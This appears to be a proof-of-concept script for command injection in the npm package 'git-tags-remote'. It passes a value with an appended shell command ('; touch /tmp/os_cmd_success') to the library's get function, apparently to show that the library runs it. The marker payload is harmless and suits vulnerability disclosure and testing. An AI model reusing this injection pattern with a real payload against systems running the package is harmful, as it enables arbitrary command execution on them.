const gtr = require('git-tags-remote');
(async () => {
  try {
    const payload = "dummy; touch /tmp/os_cmd_success";
    await gtr.get(payload);
  } catch (err) {
  }
})();
